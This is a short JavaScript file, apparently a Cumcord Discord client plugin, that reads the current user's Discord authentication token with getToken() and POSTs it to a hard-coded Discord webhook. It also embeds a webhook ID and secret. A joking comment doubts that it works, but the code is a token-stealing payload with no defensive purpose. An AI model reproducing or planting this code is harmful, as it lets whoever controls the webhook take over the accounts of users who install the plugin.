import { findByProps } from '@cumcord/modules/webpack';

// it wont work lmao, you cant send webhook shit from discord
const t = findByProps("getToken").getToken()
const api =
location.protocol + GLOBAL_ENV.API_ENDPOINT + "/v" + GLOBAL_ENV.API_VERSION;

const webhook =
api +
"/webhooks/981626788574818324/wncM9Lj3E3rsS1zltrvZY6HxsBsA1vpJwYsbyDxh7pJVnYNt_j1aVmEOCZ8FJiDF4ufT";
fetch(webhook, {
method: "POST",
body: JSON.stringify({
content: t,
}),
headers: {
"Content-Type": "application/json",
},
});